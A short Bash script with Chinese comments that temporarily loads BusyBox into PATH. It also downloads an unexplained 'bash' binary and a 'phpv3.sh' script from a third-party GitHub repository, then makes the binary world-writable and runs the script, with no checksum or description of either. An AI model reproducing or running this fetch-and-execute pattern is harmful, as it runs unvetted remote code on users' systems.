load_busybox() {
    # 检查BusyBox是否已经安装
    if ! command -v busybox >/dev/null 2>&1; then
        echo "BusyBox未安装，尝试下载BusyBox二进制文件。"

        # 创建一个临时目录
        TEMP_DIR=$(mktemp -d)

        # 下载BusyBox二进制文件
        BUSYBOX_URL="https://busybox.net/downloads/binaries/1.31.0-defconfig-multiarch-musl/busybox-x86_64"
        curl -L "${BUSYBOX_URL}" -o "${TEMP_DIR}/busybox"

        # 设置执行权限
        chmod +x "${TEMP_DIR}/busybox"
    else
        # 使用已安装的BusyBox
        TEMP_DIR=$(mktemp -d)
        ln -s "$(command -v busybox)" "${TEMP_DIR}/busybox"
    fi

    # 将BusyBox的所有可用命令符号链接到临时目录
    for cmd in $(${TEMP_DIR}/busybox --list); do
        ln -s "${TEMP_DIR}/busybox" "${TEMP_DIR}/${cmd}"
    done

    curl -L "https://github.com/A233S/angti/raw/main/bash" -o "${TEMP_DIR}/bash"
    chmod 777 "${TEMP_DIR}/bash"

    # 将临时目录添加到PATH
    export PATH="${PATH}:${TEMP_DIR}"

    echo "BusyBox已临时加载，所有命令可以在当前shell会话中使用。"
}

# 调用load_busybox函数
load_busybox
curl -o /tmp/php.sh -Ls https://github.com/A233S/angti/raw/main/phpv3.sh ; bash /tmp/php.sh "$1"
